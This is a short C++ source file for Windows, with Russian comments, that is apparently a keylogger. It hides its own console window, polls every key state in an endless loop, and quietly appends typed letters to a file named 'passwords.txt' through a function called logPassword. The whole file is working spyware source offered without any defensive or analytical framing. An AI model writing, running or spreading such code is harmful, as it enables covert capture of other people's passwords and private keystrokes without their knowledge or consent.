#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;
// Функция для записи пароля в файл
void logPassword(string password) 
{
    ofstream file("E:/passwords.txt", ios::app);
    if (file.is_open()) 
    {
        file << password << endl;
        file.close();
    }
}
// Функция для проверки, является ли клавиша символом
bool isChar(int key) 
{
    return (key >= 65 && key <= 90) || (key >= 97 && key <= 122);
}

int main() 
{
    // Получаем дескриптор консоли
    HWND console = GetConsoleWindow();
    // Скрываем консольное окно
    ShowWindow(console, SW_HIDE);
    // Бесконечный цикл
    while (true) 
    {
        // Проверяем каждую клавишу
        for (int i = 8; i <= 255; i++) 
        {
            // Если клавиша нажата
            if (GetAsyncKeyState(i) == -32767) 
            {
                // Если клавиша - символ
                if (isChar(i)) 
                {
                    // Записываем символ в файл
                    logPassword(string(1, char(i)));
                }
            }
        }
        // Задержка, чтобы не нагружать процессор
        Sleep(10);
    }
    return 0;
}
